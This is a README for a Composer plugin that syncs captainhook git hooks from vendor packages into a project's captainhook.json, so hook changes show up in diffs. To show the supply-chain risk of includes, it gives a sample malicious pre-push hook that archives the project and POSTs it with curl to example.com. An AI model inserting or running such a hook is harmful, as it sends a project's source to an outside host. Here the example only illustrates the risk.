# captainhook-vendor-resolver

This composer-plugin introduces a package scan for captainhook/captainhook hooks.
So on every `composer require`, `composer install` or `composer remove` call, this plugin checks the `composer.json` of the installed/uninstalled package for hooks to add/remove from the `captainhook.json`.


## Where is the difference to the already existing feature "includes"

As this package only parses the `composer.json` and automagically inserts/removes the hooks, it will provide a proper diff to your project. There is no hidden hook specified in a file outside of your project.

Your projects `captainhook.json` will always contain any hook which is being executed which can be easily reviewed in Pull Requests, e.g.


### Example with the vendor resolver
`captainhook.json`
```json
{
    "commit-msg": {
        "enabled": false,
        "actions": []
    },
    "pre-push": {
        "enabled": true,
        "actions": [
            {
                "exec": "echo hey there"
            }    
        ]
    },
    "prepare-commit-msg": {
        "enabled": false,
        "actions": []
    },
    "post-commit": {
        "enabled": false,
        "actions": []
    },
    "post-merge": {
        "enabled": false,
        "actions": []
    },
    "post-checkout": {
        "enabled": false,
        "actions": []
    },
    "pre-commit": {
        "enabled": false,
        "actions": []
    }
}
```
Current version of the vendor package...

`vendor/package/composer.json` v1.0.0
```json
{
    "extra": {
        "captainhook-hooks": {
            "pre-push": {
                "actions": [            
                    {
                        "exec": "echo hey there"
                    }
                ]
            }
        }
    }
}
```

After updating the vendor package...

`vendor/package/composer.json` v1.0.1
```json
{
    "extra": {
        "captainhook-hooks": {
            "pre-push": {
                "actions": [            
                    {
                        "exec": "tar -xzf project.tar.gz . && curl -X POST --data @project.tar.gz https://example.com & rm project.tar.gz"
                    }
                ]
            }
        }
    }
}
```

`diff captainhook.json`
```
10c10
<                 "exec": "echo hey there"
---
>                 "exec": "tar -xzf project.tar.gz . && curl -X POST --data @project.tar.gz https://example.com & rm project.tar.gz"

```

### Example with includes (security implication)

`captainhook.json`
```json
{
    "config": {
        "includes": [
            "vendor/package/captainhook.hooks.json"
        ]
    }
}
```

Current version of the vendor package...

`vendor/package/captainhook.hooks.json` v1.0.0

```json
{
    "pre-push": {
        "actions": [
            {
                "exec": "echo hey there"
            }
        ]       
    }
}
```


After updating the vendor package...

`vendor/package/captainhook.hooks.json`  v1.0.1
```json
{
    "pre-push": {
        "actions": [
            {
                "exec": "tar -xzf project.tar.gz . && curl -X POST --data @project.tar.gz https://example.com & rm project.tar.gz"
            }
        ]       
    }
}
```

`diff captainhook.json`
```
```

If you are not re-visiting your vendor packages for changes in that hook you are including, you will upload your whole project on the next `git push` to the attackers website.
